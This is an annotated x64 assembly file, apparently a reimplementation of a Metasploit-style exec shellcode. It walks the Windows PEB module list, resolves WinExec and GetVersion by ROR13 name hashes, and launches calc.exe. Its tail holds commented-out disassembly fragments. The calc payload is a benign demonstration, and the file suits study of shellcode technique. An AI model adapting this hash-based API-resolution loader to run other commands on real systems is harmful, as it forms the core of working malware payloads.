bits 64
default rel

segment .data
    calc: db "calc.exe", 0

segment .text
global main

main:
        cld
        and rsp, 0xFFFFFFFFFFFFFFF0
        call get_calc_str                           ; call offset?
        push r9
        push r8
        push rdx
        push rcx
        push rsi
        xor rdx,rdx
        mov rdx, qword gs:[rdx+0x60]     ; rdx = PEB
        mov rdx, qword [ds:rdx+0x18]     ; rdx = PEB_LDR_DATA
        mov rdx, qword ds:[rdx+0x20]     ; rdx = LIST_ENTRY InMemoryOrderModuleList / InMemoryOrderLinks
    label5_load_module_name:
        mov rsi, qword ds:[rdx+0x50]     ; rsi = BaseDllName = _UNICODE_STRING + 0x2 = 
        movzx rcx, word ds:[rdx+0x4A]
        xor r9,r9
    loop1:
        xor rax,rax                       ; loop start - BaseDllName hash (useless?)
        lodsb
        cmp al, 0x61
        jl rord
        sub al, 0x20
    rord:
        ror r9d, 0xD
        add r9d,eax
        loop loop1                  ; loop - r9 = BaseDllName hash when done
        push rdx
        push r9
        mov rdx, qword ds:[rdx+0x20]     ; rdx = DllBase
        mov eax,dword ds:[rdx+0x3C]     ; eax = e_lfanew
        add rax,rdx                       ; rax = PE header
        mov eax,dword ds:[rax+0x88]     ; 
        test rax,rax
        je label1
        add rax,rdx
        push rax
        mov ecx,dword ds:[rax+0x18]
        mov r8d,dword ds:[rax+0x20]
        add r8,rdx
    label4:
        jrcxz label2_call_found
        dec rcx
        mov esi,dword ds:[r8+rcx*4]
        add rsi,rdx
        xor r9,r9
    label3:
        xor rax,rax
        lodsb
        ror r9d, 0xD
        add r9d,eax
        cmp al,ah
        jne label3
        add r9, qword ss:[rsp+0x8]
        cmp r9d,r10d                  ; r9d calculated hash, r10d desired hash
        jne label4
        pop rax
        mov r8d,dword ds:[rax+0x24]
        add r8,rdx
        mov cx,word ds:[r8+rcx*2]
        mov r8d,dword ds:[rax+0x1C]
        add r8,rdx
        mov eax,dword ds:[r8+rcx*4]
        add rax,rdx
        pop r8
        pop r8
        pop rsi
        pop rcx
        pop rdx
        pop r8
        pop r9
        pop r10
        sub rsp, 0x20
        push r10
        jmp rax                       ; "call" desired function 
    label2_call_found:
        pop rax
    label1:
        pop r9
        pop rdx
        mov rdx, qword ds:[rdx]    ; rdx = _LIST_ENTRY* Flink (next module)
        jmp label5_load_module_name
    get_calc_str:
        pop rbp                       ; rbp = return address (base + 0xa)
        mov rdx, 0x1
        lea rcx, qword ss:[rbp+0xF8]
        mov r10d, 0x876F8B31
        call rbp                      ; look for WinExec ()
        mov ebx, 0x56A2B5F0
        mov r10d, 0x9DBD95A6
        call rbp                      ; Look for GetVersion (rbp = shellcode_base + 0A)
        add rsp, 0x48
        ret
    ;     add rsp, 0x28
    ;     cmp al, 0x6
    ;     jl label6
    ;     cmp bl, 0xE0
    ;     jne label6
    ;     mov ebx, 0x6F721347
    ; label6:
    ;     push 0x0
    ;     pop rcx                       ; rcx = 0 (arg for next call)
    ;     mov r10d,ebx
    ;     call rbp                      ; rbp = FatalExit

; movsxd esp, dword ds:[rcx+0x6C]
; movsxd ebp, dword ds:[rsi]
; js label7_ret
; add byte ds:[rax],al
; label7_ret
; ret